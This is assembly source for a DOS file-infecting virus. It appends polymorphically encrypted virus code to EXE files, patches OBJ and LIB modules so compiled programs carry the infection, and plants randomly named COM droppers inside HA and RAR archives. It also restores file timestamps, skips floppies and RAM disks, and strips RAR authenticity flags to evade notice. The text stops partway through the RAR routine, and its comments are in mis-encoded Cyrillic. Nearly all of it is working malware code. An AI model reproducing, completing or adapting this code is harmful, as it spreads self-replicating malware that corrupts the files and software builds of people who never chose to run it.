
; BUG LIST
; 1. no infect ARJSFX
; 2. no -AV in ZIP
; 3. no support RAR 1.30
; 4. no support long names

INCLUDE ZURICH.ASI



code segment byte public
assume cs:code, ds:code, es:code, ss:code
STACKBASE       equ 080h

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
extrn   DOSCALL             :near
extrn   DOStruncate         :near
extrn   rt_err              :near
extrn   vir_heap            :near
extrn   EXE_TEST            :near
extrn   SEEK_END            :near
extrn   TEST_SIZE           :near
extrn   START_DATA          :near
extrn   CALC_HDR_PAGES      :near
extrn   DOSSEEK             :near
extrn   START_DATA          :near
extrn   DOSSEEK_BOF         :near
extrn   ZME_crypt           :near
extrn   dosseek_cur         :near
extrn   DosCall_exc         :near
extrn   SHIT_AX             :near
extrn   get_sft             :near
extrn   dostell             :near
extrn   heap                :near
extrn   DosSeek_all         :near
extrn   dosseek_cur_neg_dx  :near
extrn   dosseek_cur_neg_ax  :near
extrn   dosseek_cur_cx_1    :near
extrn   dosseek_cur_cx_0    :near
extrn   dosseek_cx_0        :near
extrn   arj_h               :near
extrn   zip_h               :near
extrn   dosread             :near
extrn   read_buf_22         :near
extrn   read_buf_cx         :near
extrn   DosWrite_shbuf_22   :near
extrn   DosWrite_shbuf      :near
extrn   DosWrite            :near
extrn   dosclose            :near
extrn   doswrite_from_heap  :near
extrn   _____               :byte
extrn   Calculate_CRC       :near
extrn   get_cur_time        :near
extrn   get_crc_just_fname  :near
extrn   InfectTurn          :byte
extrn   crypt_exe_header    :near
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel InfectName
    MOVSEG  ds, cs
    lea     dx, InfectTurn
    call    get_crc_just_fname
    jz      $ret$
    cmp     ax, [turn_name_crc]
    je      $ret$
    mov     [turn_name_crc], ax
    mov     ax, 3D12h
    call    DosCall_exc
    xchg    bx, ax
    push    bx
    call    InfectHandle
    pop     bx
    jmp     dosclose
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel InfectHandle ;ret
;    cld
    MOVSEG  ds, cs
    MOVSEG  es, cs
    call    no_freq_proc
    mov     ax, 5700h
    call    doscall
    mov     [host_arx_date], dx ;  dx = date
    mov     [host_arx_time], cx ;  cx = time
    mov     ah, 2Ah  ; ¯®«ãç¨âì â¥ªãéãî ¤ âã ¨ ......
    call    doscall
    xor     dx, [host_arx_date]    ;­¥ § à ¦ âì ä ©«ë íâ®© ­¥¤¥«¨
    and     dx, 18h ;week only         ; ¨áª«. á®§¤ ¢ ¥¬ë¥ ä ©«ë (?)
    DOIF NZ
        call    arxtest
    DONE
    mov     cx, [host_arx_time]
    xor     cl, 1   ;change time for 1F
    mov     dx, [host_arx_date]
    mov     ax, 5701h
    jmp     doscall_exc
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel arxtest ;close file(?)
    call    RND_INIT
    mov     ax, 4400h        ; IOCTL test for file/stream
    call    DosCall_exc
    cmp     dl, 80h
    DOIF NC
$ret:   pop ax ;don't restore file time
$ret$:  retn
    DONE
    and     dl, 0Fh
    inc     dx  ;1=a, 3=C

;IFDEF RELIZ
;   cmp     dl, 3
;ELSE
;   cmp     dl, 4
;    jbe      $ret ; no flop & C:
;ENDIF
;    jc      $ret ; no flop
;int 2bh

cmp     dl, 3 ;<<debug
jbe  $ret      ;<<debug
$BEEP$
;cmp     dl, 2 ;<<debug
;je  $ret      ;<<debug
;cmp     dl, 1 ;<<debug
;je  $ret      ;<<debug

        call    get_sft
        cmp     es:[di.sf_name.9], 'V' ;*.ov?
        je      $ret
        inc     di
        DOIF NZ
            inc    di
            sto_word  2012h
            sto_byte  20h
        DONE

        movseg  es, ss


    push    bx ds
    mov     ah, 32h           ;get DPB
    call    DosCall                ;test for RAM-DISK
    cmp     byte ptr ds:dpb_FAT_count[bx], 1  ;RAM-DISK have one FAT
    DOIF NE
        mov     ah, 36h           ;get Disk space
        call    DosCall          ;BX - free clusters
        and      bh, bh           ;BX < 100h
    DONE
;no_free_space2:                  ;8k*100h  = 2Mb
    pop     ds bx            ;.5k*100h = 128k
    jz      $ret

;int 2bh
;    mov     es:[(di-1).sf_mode.l], 12h   ;mode +2
;    mov     es:[(di-1).sf_attr], 20h     ;attr +4

    call    dosseek_bof
pblabel second_tst
    call    read_buf_22
    cmp     al, HDRBUFSIZE
    jne     __ret
    mov     crcpass, 8
    DO
        shr     crcpass, 1
        DOIF E ;CPU conveir
__ret:
            ret
        DONE
        lea     si, [vir_heap._exehdr]
        mov     di, 2 ;4,2,1
crcpass equ byte ptr ($-2)
        call    calculate_crc
        lea     di, hdrs
        mov     cx, (offs-hdrs)/2
        repne   scasw
    CYCLE NZ

    push    word ptr [di+offs-hdrs-2]
    cmp     cx, (offs-endarxex)/2 ;<<<
    DOIF AE  ;zip, arj, rar
;Ä[create & infect file]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        call    RND_GET_BYTE
        lea     di, [heap]
        sto_byte opJMPN
        stosw
        mov     ax, zmeflARX
        call    ZME_crypt ;;ret CX-SIZE
        lea     si, [heap]
        mov     word ptr [fioff] , si
        mov     [si+1], ax  ;<com
        call    RND_GET
        and     ax, 0FFFh ;<<<<<<<<<<,
;        push    ax
        add     ax, 3    ;<com
        add     cx, ax

        mov     word ptr [fisize], cx ;<all
;        pop     ax
        call    SHIT_AX
;create & infect carrier
        mov     di, [fisize]
        call    Calculate_CRC
        mov     [arx_crc.lo], cx
        mov     [arx_crc.hi], dx
;Ä[generate name]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;int 2bh
;$BEEP$
        call    RND_GET_Three_Bits
        and     al, not 4
        add     al, 2
        mov     cx, ax
        add     al, 4
        mov     word ptr [fnamesize], ax
        lea     di, [vir_heap._fnamestr]
        DO
            DO
                call    RND_GET_BYTE
                cmp     al, 'V'-'A'   ; ('Z'-'A')
            CYCLE A
            add     al, 'A'
            stosb
        CYCLE LU
        sto_two_byte '.', 'C'
        sto_two_byte 'O', 'M'
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    DONE
    MOV    [pos98.hi], -1
$$ret:
    retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ






;ÄÅÄÄ[process EXE/SFX]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_exe
    mov     ax, [exehdr.exe_pages]
    mov     cx, [exehdr.exe_len_mod_512]
    jcxz    ExactPage
    dec     ax
pblabel ExactPage
    mov     dx, 200h
    mul     dx
    add     cx, ax
    xchg    cx, dx
    call    DosSeek
    call    second_tst
    cmp     di, offset offs-2
    jb      $$ret
;ÄÅÄÄ[process EXE]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
            ;newexetest
;            probability_test prblt_infct_EXE, 0f0h, error_exit

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;int 2bh
    call        seek_end
;§¤¥áì ®âá¥ïâì ¬ «¥­ìª¨¥ ä ©«ë
    cmp         ah, MININFECTSIZE/100H
    jb          $$ret
;................................
    call      test_size ;proc;ax-(file_size and 0FFFFh)
    jz        $$ret

    call      dosseek_bof
    call      read_buf_22
    call      exe_test
    jz        $$ret             ;already infect
;; ­¥ § à ¦ âì EXE ä ©«ë ¡¥§ à¥«®ª¥©è¥­®¢,
;¨ ¥á«¨ à¥«®ª¥©è¥­®¢ ®ç¥­ì ¬­®£® (?)
    cmp     byte ptr [exehdr.exe_rle_count], 1 ;0 or 1 relocations
    jb     $$ret
;................................

;; ¥á«¨ ¤«¨­  § £àã¦ ¥¬®© ç áâ¨ exeè­¨ª  ¡®«ìè¥ ... 32k = 40h pages
;test for pklite(etc) & PASS E
    cmp     word ptr [exehdr+18h], 40h ;
    jae     standart_exe_infect2
    mov     al, byte ptr [exehdr+1Eh]
    cmp     al, 'P' ;PKLITE ?
    je      standart_exe_infect2
    cmp     al, 20h ;07, 20h -WATCOM
    je      standart_exe_infect2
    cmp     al, 7   ;07, 20h -WATCOM
    je      standart_exe_infect2
    cmp     byte ptr [exehdr.exe_pages], 40h
    jbe     standart_exe_infect2
pblabel insert_exe_infect
        mov     dx, [exehdr.exe_par_dir]
        shl     dx, 4
        jc      standart_exe_infect2 ;if header>64k
        call    dosseek_cx_0
        lea     dx, [heap]
        mov     cx, 1800h ;6k
        call    DosRead
        xchg    cx, ax
        ;scan
        lea     si, [heap+2]
        DO
            mov     di, 3
            dec     si
            dec     si
            push    cx
            call    calculate_crc    ;<add si,3
            cmp_ax_CRC32w  <55h, 8Bh, 0ECh> ;push bp; mov bp,sp ;< BORLAND
            je      exfnd
            cmp_ax_CRC32w  <55h, 89h, 0E5h> ;push bp; mov bp,sp ;< BORLAND
            je      exfnd
pblabel cont_search
            pop     cx          ;
        CYCLE LU
pblabel standart_exe_infect2
        jmp standart_exe_infect
pblabel exfnd
sizeof_part1=54h
        push    si
        mov     cx, sizeof_part1
        DO
            lodsb
            push    cx
            lea     di, endd
            mov     cx, 6
            repne scasb
            pop     cx
;            jz      nff
            ;nff:
            DOIF Z
                pop     si
                jmp     cont_search
            DONE
        CYCLE LU
        pop     si
;$BEEP$
extrn ffsize_lo:word
extrn ffsize_hi:word
        call    seek_end
        mov     ffsize_lo, ax
        mov     ffsize_hi, dx
        mov     dx, [exehdr.exe_par_dir]
        shl     dx, 4
        add     dx, si
        sub     dx, (offset heap)+3
        call    dosseek_cx_0
        lea     dx, [heap+sizeof_part2]
; to heap+sizeof(part2)
        mov     cx, sizeof_part1
        call    DosRead
        call    dosseek_cur_neg_ax
            ;§¤¥áì part 1
extrn part1:near
extrn part2:near
;¢ë¡®à ªà¨¯â®¢é¨ª  ¤«ï part2 (?)
extrn crypt_part2:byte
        call    RND_GET
        mov     crypt_part2,  al
        mov     crypt_old1,  ah
        lea     dx, part1
        mov     cx, sizeof_part1
        call    DosWrite
        call    seek_end
sizeof_part2 = 70h
;«ãçè¥ çâ®-â® ¢à®¤¥:
; part2 -> heap
; encode virus to heap+sizeof(part1)+sizeof(part2)
        lea     di, [heap+sizeof_part1+sizeof_part2]
        mov     ax, zmeflIXE
        call    ZME_crypt ;;ret CX-SIZE
extrn ffentrvir:word
extrn crypt_old1:byte
        mov     ffentrvir, ax ;?
        lea     si, part2
        lea     di, [heap]
        push    cx
        mov     cx, sizeof_part2
        DO
            lodsb
            sub     al, crypt_part2
            stosb
        CYCLE LU
        mov     cx, sizeof_part1
        mov     al, crypt_old1
        DO
            sub     byte ptr [di], al
            inc     di
        CYCLE LU
        pop     cx

; crypt part2

        add     cx, (sizeof_part1+sizeof_part2)
        call    doswrite_from_heap
        call    write_sizemarker
pblabel error_exit_2
        pop     ax
pblabel endd
        db        0C3h
        db        0CBh
        db        0CFh
        db        09Ah
        db        0CAh
        db        0C2h
pblabel no_freq_proc
    call    get_cur_time
    sub     ax, [last_infect_time]
    cmp     ax, INTERVAL_INFECT ;0.5 ¬¨­
IFDEF RELIZ
    jl      error_exit_2 ;<<<<<<<<<debug
ENDIF
    ret




;        ret

;    DONE
pblabel standart_exe_infect
    call      seek_end   ;dx:ax - file size
    test      al, 1
    jnz       endd       ;­¥ § à ¦ âì EXEä ©«ë á ­¥ç¥â­®© ¤«¨­®©
    cmp       dl, 6       ;6*64k=384k 4*64k=256k
    jae       endd       ;file too big, infect him other method (?)

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;write old header to EOF
    push    ax dx       ;dx:ax - file size
    call    crypt_exe_header
    mov     cx, exe_rle_table-exe_len_mod_512 ;14h
    call    doswrite_from_heap
    pop     dx ax

    mov     cx, ax
    and     cx, 0Fh
    add     cl, STACKBASE ;offset virus_start-10h
    mov     [exehdr.exe_SP], cx

    add     ax, VIRUSSTACKSIZE-10h          ;paragraph
    and     ax, not 0Fh

    push    ax dx
    mov     cx, dx
    mov     dx, ax
    call    dosseek
    pop     dx ax

    mov     cx, 10h
    div     cx      ;dx:ax =
    sub     ax, [exehdr.exe_par_dir]
    sub     ax, VIRUSSTACKSIZE/10h
    mov     [exehdr.exe_CS], ax
    add     ah, cl
    mov     [exehdr.exe_SS.h], ah ;64k
    call    RND_GET_THREE_BITS
    add     [exehdr.exe_SS.h], al ;


    lea     di, [heap] ;to heap
    mov     ax, zmeflEXE
    call    ZME_crypt ;;ret CX-SIZE
    add     ax, VIRUSSTACKSIZE
    mov     [exehdr.exe_IP], ax
    call    doswrite_from_heap ;write encrypted virus
    call    write_sizemarker
    call    seek_end ;get file size
    mov     di, [exehdr.exe_pages]
    call    calc_hdr_pages
;ã¬¥­ìè¨âì MinMem ­  à §¬¥à ®¢¥à«¥ï (?)
    sub     di, [exehdr.exe_pages] ;®âà¨æ.
    shl     di, 5
    add     [exehdr.exe_min_BSS], di
    DOIF NC
        mov     [exehdr.exe_min_BSS], 0
    DONE
pblabel write_exehdr
    call    dosseek_bof
    mov     cx, 1Ch
    jmp     DosWrite_shbuf  ;write new header




;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÅÄÄ[process OBJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel cycle_o
    mov     dx, [objhdr.recsize]
    sub     dx, HDRBUFSIZE - 3
    sbb     cx, cx
    call    dosseek_cur ;_cx_0
    call    read_buf_22 ;
    cmp     al, HDRBUFSIZE
    jne     obj$ret1
pblabel process_obj ;test size
;int 2bh
    cmp     [objhdr.rectype], MODEND
    je     obj$ret1
;-+-[process 98]-------------+-
    cmp     [objhdr.rectype], SEGDEF
    PASS NE
    CMP    [pos98.hi], -1
    DOIF E
    cmp word ptr [objhdr.recsize], 7
    jne     obj$ret1
    test    byte ptr [objhdr.segattr], MASK SA_B or MASK SA_P
    jnz     obj$ret1
    test    byte ptr [objhdr.segattr], 0A0h ;borland windows library is WORD alignment
;    test    byte ptr [objhdr.segattr], MASK SA_A

    DOIF Z
obj$ret1: stc
          ret
    DONE
    call    dostell
    sub     ax, HDRBUFSIZE
    sbb     dx, 0
    mov     [pos98.lo], ax
    mov     [pos98.hi], dx
    mov     ax, word ptr [objhdr.segsize]
    cmp     ax, 0Ah
    jb      obj$ret
    cmp     ah, 3
    ja      obj$ret
    mov     [siz98], ax
    DONE
;-+--------------------------+-
pblabel process_A0
;-+-[process A0]-------------+-
    cmp     [objhdr.rectype], LEDATA
    jne     cycle_o
rzheap equ <heap+80h>
;read (rzheap+80h, [objhdr.recsize]-4)
    mov     ax, HDRBUFSIZE -6h
    call    dosseek_cur_neg_ax
    sub     ax, 6h
    sbb     dx, 0
    mov     [posA0.lo], ax
    mov     [posA0.hi], dx
    lea     dx, [rzheap]
    mov     di, dx
    mov     cx, [objhdr.recsize]
    sub     cx, 4h
    call    dosread
    push    bx      ;save file handle
    push    ax ;size A0 before infect
    add     di, ax
    push di
;encode virus (rzheap+[objhdr.recsize]-4)
    mov     ax, zmeflOBJ
    call    ZME_crypt ;;ret CX-SIZE
;                    mov     [_____], ah
;                    mov     si, VIRUSSTACKSIZE
;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size
;                    mov     [engdata.datasize], cx
;                    mov     [engdata.targetptr], di
;                    rep     movsb          ;copy data
;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size
;                            xor ax,ax
    xchg    bx, ax ; entry virus



;¬®¦¥â ®áë¯ âìáï, ¥á«¨ ã¢¥«¨ç¨âì à §¬¥à ¢¨àãá . á¥©ç á 7000
;­ ¤®, çâ®¡ë ¡ë«® 9 ¡«®ª®¢.?
;mov ax, cx
;add ax, 3DFh
;dec ax
;cwd
;mov si, 3E0h
;div si
;inc ax
;cwd
;mov si, 3E9h
;mul si
mov ax, di
sub ax, offset rzheap
cwd
mov si, 3E0h
div si
mov dl, 7
mul dl
add ax, cx
and ax, 0Fh
sub cx, ax
add cx, 10h
pop di
add di, cx
mov     word ptr [fisize], cx



;scan
    pop     cx  ;size A0 before infect
    push    di  ;ptr to end A0 & virus
    lea     si, [rzheap+2]
    DO
        mov     di, 3
        dec     si
        dec     si
        push    cx
        call    calculate_crc    ;<add si,3
        pop     cx          ;
        cmp_ax_CRC32w  <55h, 8Bh, 0ECh> ;push bp; mov bp,sp ;< BORLAND
        je      fnd
        cmp_ax_CRC32w  <55h, 89h, 0E5h> ;push bp; mov bp,sp ;< BORLAND
        je      fnd
        cmp_ax_CRC32w  <52h, 89h, 0C2h> ;push dx; mov dx,ax ;< WATCOM
        je      fnd
    CYCLE LU

    pop ax
;error_exit_2:
    pop ax
obj$ret: stc  ;CF - error flag for process_lib
    ret
fnd:
    mov     byte ptr [si-3], opCALL
    lea     ax, [bx-3]
    add     ax, cx
    mov     word ptr [si-2], ax ;, 00 ;(cx+bx-3)
    pop     dx      ;ptr to end A0 & virus
    pop     bx      ;restore file handle
;rezka
    lea     si, [rzheap]
    lea     di, [heap]
    DO      ;@repeat:
        sto_byte LEDATA
        mov     ax, dx
        sub     ax, si
        MIN     ax, 3E0h
        push    ax         ;block size
        add     ax, 4
        stosw
        sto_byte 1
        mov     ax, si
        sub     ax, offset rzheap
        stosw
        pop     cx
;/----crc-------------------\
        add     al, byte ptr [di-4]
        add     al, byte ptr [di-5]
        add     al, ah
        add     al, LEDATA+1
        DO
            add al, byte ptr [si]
            movsb
        CYCLE LU
        neg    al
        stosb
;\--------------------------/
        cmp     si, dx
    CYCLE B ;    jb      @repeat

    sub     di, (offset heap)+3E7h
    push    di   ;razmer wtorogo finserta

;seek_pos(posA0)????
     mov     dx, [posA0.lo]
     mov     cx, [posA0.hi]
     call    dosseek
;write (heap, [objhdr.recsize]+3)
     mov     cx, [objhdr.recsize]
     add     cx, 3
     call    doswrite_from_heap
;f_insert (heap+[objhdr.recsize], 3E7h-([objhdr.recsize]+3))
     mov     si, ax
     add     si, dx
     mov     cx, 3E7h
     sub     cx, ax
     add     di, cx
     mov     [lib_dict_offset], di
;     adc     [lib_dict_offset.hi], 0
     push    cx
      call    dostell
     pop     cx
     call    f_insert
;read (objhdr, 22h)
;---- skip FIXUPP if present
     call    read_buf_22
     cmp     [objhdr.rectype], FIXUPP
     DOIF E
        sub     ax, 3
        sub     ax, [objhdr.recsize]
     DONE
     call    dosseek_cur_neg_ax
;f_insert (heap+3E7h, virrsize-3E7h)
     lea     si, [heap+3E7h]
    pop     cx  ;virrsize-3E7h
    call    f_insert
;-process-segment------------
    mov     dx, [pos98.lo]
    mov     cx, [pos98.hi]
    call    dosseek
    call    read_buf_22
    call    dosseek_cur_neg_ax
    mov     ax, [fisize]
    add     word ptr [shift_buffer.segsize], ax
;/----crc-------------------\
    mov     cx, [objhdr.recsize]
    lea     si, [vir_heap._objhdr]
    inc cx
    lodsb
    DO
        add al, byte ptr [si]
        inc si
    CYCLE LU
    neg     al
    mov     byte ptr ds:[si], al
;\--------------------------/
    jmp     DosWrite_shbuf_22




;ÄÅÄÄ[process LIB]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_lib
;CALL CHECK_PROCESS_NAME
; âª § à ¦¥­¨¥ LIB § ­¨¬ ¥â ¬­®£® ¢à¥¬¥­¨
; íâ® áâ®¨â ¤¥« âì ¯à¨ à ¡®â¥ NDD, PKLITE, TLINK, etc

    cmp     byte ptr [libhdr.lib_hdr_dict_offs], 0
    jne     lib$ret ;already infect
    DO                                      ;infect exitcode of 'C' program
        mov     di, 8                       ;search for 'EXIT'
        lea     si, [vir_heap._libhdr]
        call    calculate_crc    ;<add si,3
;; § à ¦¥­¨¥ '___write', '__ioalloc_' ¨â¯
        cmp_ax_CRC32w <80h, 6, 0, 4, 'E', 'X', 'I', 'T'>      ;< BORLAND
        je      exfound
        cmp_ax_CRC32w <80h, 6, 0, 4, 'e', 'x', 'i', 't'>      ;< WATCOM
        je      exfound
        mov     dx, 10h-HDRBUFSIZE
        call    dosseek_cur_cx_1
        mov     cx, 10h
        div     cx
        mov     [virobjblk], ax
        call    read_buf_22
        cmp     al, HDRBUFSIZE
    CYCLE E
end_process_dictionary:
lib$ret:    ret


pblabel exfound
    cmp     byte ptr [libhdr+14h], 32h
    je      lib$ret
    call    process_obj ;hmmm...
    jc      lib$ret
    call    dosseek_bof
    call    read_buf_22
    mov     ax, [lib_dict_offset]
    add     [libhdr.lib_hdr_dict_offs.lo], ax
    adc     [libhdr.lib_hdr_dict_offs.hi], 0
    call    write_exehdr
;    call    dosseek_bof
;    call    doswrite_shbuf_22
;¢ á«®¢ à¥:  ¤«ï ¢á¥å § ¯¨á¥© > exit_ ¤®¡ ¢¨âì à §¬¥à ¢áâ ¢ª¨ ¢ ¯ à £à ä å
;seek (lib_hdr_dict_offs)
    mov     cx, [libhdr.lib_hdr_dict_offs.hi]
    mov     dx, [libhdr.lib_hdr_dict_offs.lo]
    call    dosseek
    DO
        lea     dx, [heap]
        mov     cx, LIB_DICTIONARY_ENTRY_SIZE
        call    dosread                 ; read (heap, 0x200)
        mov     dx, LIB_DICTIONARY_ENTRY_SIZE
        cmp     ax, dx                  ; ¯®â®¬ á¤¥« © ç¥à¥§ SAHF
        jne     end_process_dictionary  ;< ¯®á«¥ íâ®£® ­ ¤®-¡ë
        call    dosseek_cur_neg_dx      ; áâàã­ª¥©â¨âì extended dictionary.
        lea     si, [heap]              ; process:)
        mov     cx, 25h
        DO
            lodsb
            push    si
            mov     ah, ch   ;ch=0
            add     ax, ax
            DOIF NZ
                add     ax, offset heap
                xchg    si, ax
                lodsb
                mov     ah, ch   ;ch=0
                add     si, ax
                cmp     word ptr [si], UNINIT
virobjblk equ word ptr ($-2)
                DOIF A
                    mov     ax, [lib_dict_offset]
                    shr     ax, 4
                    add     word ptr [si], ax
                DONE
            DONE
            pop     si
        CYCLE LU
        mov     cx, LIB_DICTIONARY_ENTRY_SIZE
        call    doswrite_from_heap      ; write (heap, 0x200)
    CYCLE
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÅÄÄ[process HA]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_ha
;int 2bh
    mov     ax, [hahdr.filecnt]
    inc     ax
    mov     [hafcount], ax
    mov     ax, HDRBUFSIZE - (size ha_main)
    call    dosseek_cur_neg_ax
    jmp     sss
pblabel cycle8
;seek(size ha_file_hdr)+size name+machine+1
    lea     si, [vir_heap._hahdr.ha_name]
    mov     cx, 42h ; max length name
    DO
        lodsb
        and     al, al
    CYCLE LUNZ
    jcxz    error_exit2
    lodsb
    mov     ah, 0
    sub     cx, 34h
    sub     ax, cx
    sbb     cx, cx                            ;<cx=0
    add     ax, [hahdr.ha_compress_size.lo]
    adc     cx, [hahdr.ha_compress_size.hi]
    xchg    dx, ax
    call    dosseek_cur
sss:
;read(header)
    call    read_buf_22
    cmp     [hahdr.ha_ver_method], HA_METHOD_STORED
    je      error_exit2
    cmp     al, HDRBUFSIZE
    je      cycle8
    cmp     al, 0
    jne     error_exit2
;/+- CREATE HAHDR -+-
    lea     di, [vir_heap._crthdr]
    sto_byte  HA_METHOD_STORED
    call    store_fisize
    lea     si, [vir_heap._arx_crc]
    movs4                   ;d;file crc_32
    call    create_dtim1
    sto_byte 0              ;    sto_word '/'
    call    store_fname
    sto_two_byte    0, 2
    sto_two_byte    1, 20h
;\+- CREATE HAHDR -+-
    mov     cx, [fnamesize]
    add     cx, SIZE ha_file_hdr + 3 ; 0h
    lea     dx, [vir_heap._crthdr]
    call    doswrite
    mov     cx, word ptr [fisize]
    mov     dx, word ptr [fioff]
    call    doswrite
    mov     dx, 2
    call    dosseek_cx_0
    mov     cx, 2
    lea     dx, [vir_heap._hafcount]
    jmp     doswrite
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÅÄÄ[process RAR]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_rar
    DO
        cmp     [rarhdr.rar_head_type], 73h ;
        DOIF E ;test for multi-volume archive (?)
            test    byte ptr [rarhdr.rar_head_flags], 1h
            DOIF NZ
pblabel error_exit2
    ret
            DONE ; remove Authenticity information present flag
            and     byte ptr [rarhdr.rar_head_flags], not 20h
            call    dosseek_cur_neg_ax
            mov     di, SIZE rar_main_hdr - 2
